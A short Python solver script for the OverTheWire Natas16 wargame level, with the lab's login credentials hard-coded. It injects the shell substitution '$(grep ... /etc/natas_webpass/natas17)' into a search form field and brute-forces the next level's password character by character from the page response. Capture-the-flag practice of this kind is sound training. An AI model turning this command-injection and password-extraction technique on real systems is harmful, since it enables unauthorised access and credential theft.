import requests, string, sys

ALPHABET = string.ascii_letters + string.digits
URL = "http://natas16.natas.labs.overthewire.org/"
USER = "natas16"
PASS = "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb"

def _initialize_sesh():
    session = requests.Session()
    session.auth = (USER, PASS)
    initial_res = session.get(URL)
    if initial_res.status_code == 200:
        print(f"Initial connection to {URL} has been established")
    return session

def main(session : requests.Session):
    print("Now running boolean bruteforcer...")
    password = ""
    while (len(password) < 32):
        for char in ALPHABET:
            sys.stdout.write(f"\rTrying char {char}")
            sys.stdout.flush()

            # the ^ "anchor" makes sure it searches if it starts with password+char
            payload = f"money$(grep ^{password}{char} /etc/natas_webpass/natas17)"
            resp = session.post(URL, data = {'needle' : payload})

            if "money" in resp.text:
                continue
            else:
                password += char
                sys.stdout.write(f"\r New char found! Pass so far is {password}".ljust(40) + "\n")
                break
    
    return password


if __name__ == "__main__":
    sesh = _initialize_sesh()
    print(main(sesh))   
